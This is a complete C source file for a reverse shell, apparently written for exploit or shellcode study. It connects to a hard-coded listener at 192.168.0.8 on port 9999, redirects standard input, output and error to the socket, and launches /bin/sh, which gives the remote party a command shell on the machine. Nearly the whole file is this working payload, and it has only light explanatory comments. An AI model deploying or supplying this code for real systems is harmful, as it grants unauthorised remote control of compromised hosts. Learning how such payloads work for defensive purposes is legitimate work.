#include <stdio.h> 
#include <unistd.h>
#include <sys/socket.h> 
#include <netinet/in.h> 

int sockfd;  // socket file descriptor

struct sockaddr_in addr;  // create a new client 'addr' of the structure 'sockaddr_in'


int main() 
{ 
    // Create a new TCP socket 
    sockfd = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize addr struct to connect back to server 
    addr.sin_family = AF_INET;    // server socket type address family = internet protocol address
    addr.sin_port = htons(9999);    // server listener port, converted to network byte order
    addr.sin_addr.s_addr = inet_addr("192.168.0.8");   // server listener IP, converted to network byte order

    // connect socket for the client in sockaddr struct 
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(sockfd, 0); 
    dup2(sockfd, 1); 
    dup2(sockfd, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL);

    // Close the socket descriptor
    close(sockfd); 

    return 0;
}
